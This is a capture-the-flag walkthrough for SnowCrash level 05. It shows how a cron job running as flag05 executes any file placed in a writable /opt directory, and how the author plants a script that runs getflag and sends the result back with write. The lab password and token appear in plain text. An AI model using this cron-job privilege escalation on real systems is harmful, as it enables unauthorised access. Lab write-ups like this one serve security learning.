## level 05

Logging in as the level05 user you are *instantly* greeted with a message: `You have new mail.`

```bash
ssh level05@localhost -p 4242
	   _____                      _____               _     
	  / ____|                    / ____|             | |    
	 | (___  _ __   _____      _| |     _ __ __ _ ___| |__  
	  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \ 
	  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
	 |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|
                                                        
  Good luck & Have fun

level05@localhost's password: ne2searoevaevoem4ov4ar8ap
You have new mail.
```
Inspecting our user's mail we see the following:

```bash
less /var/mail/$USER
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

This shows us that there is a cron job running every 2 minutes!  
The command `sh /usr/sbin/openarenaserver` is ran as the `flag05` user.
Doing a little bit of digging into the `/usr/sbin/openarenaserver` we can see the following:

```bash
ll /usr/sbin | grep openarenaserver
-rwxr-x---+ 1 flag05  flag05      94 Mar  5  2016 openarenaserver*
```
Lets see what it contains:

```bash
cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

It seems like there is a `openarenaserver` directory within `/opt` in which the script loops over all the files found in there and executes them.

As we happen to have write permissions to this directory we can exploit it!

Since this script is ran in a cronjob as the `flag05` user all we have to do is create a script that executes `getflag` and sends it to our current `level05` user using the `write` command.

It eventually looks something like this:
```sh
#!/bin/sh

exec getflag | write level05
```
Making sure to give the script execute permissions:
```bash
chmod 777 /opt/openarenaserver/getflag.sh
```

Now all there is left to do is wait for our flag to be delivered to us on a silver platter!
It should take up to 2 minutes for the cron job to be ran again:

```
Message from flag05@SnowCrash on (none) at X:X ...
Check flag.Here is your token : viuaaale9huek52boumoomioc
EOF
```
